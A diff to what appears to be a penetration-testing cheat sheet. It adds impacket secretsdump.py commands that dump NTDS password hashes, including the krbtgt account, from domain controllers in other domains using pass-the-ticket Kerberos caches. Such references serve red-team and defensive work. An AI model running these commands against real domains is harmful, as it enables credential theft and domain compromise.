@@ -69,6 +69,12 @@ secretsdump.py -debug -outputfile <dc_fqdn> -just-dc -user-status -hashes :<nt_h
 KRB5CCNAME=<ccache> secretsdump.py -debug -outputfile <dc_fqdn> -just-dc -user-status -no-pass -k <domain_fqdn>/<user>@<dc_fqdn>
 ```
 
+## NTDS - all cross domain (ptt)
+```bash
+KRB5CCNAME=<ccache> secretsdump.py -debug -outputfile <dst_dc_fqdn> -just-dc -user-status -no-pass -k <dst_domain_fqdn>/<user>@<dst_dc_fqdn>
+```
+
+
 
 ## NTDS - user (creds)
 ```bash
@@ -83,6 +89,12 @@ secretsdump.py -debug -outputfile <dc_fqdn> -just-dc -user-status -just-dc-user 
 ## NTDS - user (ptt)
 ```bash
 KRB5CCNAME=<ccache> secretsdump.py -debug -outputfile <dc_fqdn> -just-dc -user-status -just-dc-user <domain_fqdn>/<name|krbtgt> -no-pass -k <domain_fqdn>/<user>@<dc_fqdn>
+```
+
+
+## NTDS - user cross domain (ptt)
+```bash
+KRB5CCNAME=<ccache> secretsdump.py -debug -outputfile <dst_dc_fqdn> -just-dc -user-status -just-dc-user <dst_domain_fqdn>/<name|krbtgt> -no-pass -k <dst_domain_fqdn>/<user>@<dc_fqdn>
 ```
 
 ## NTDS - offline
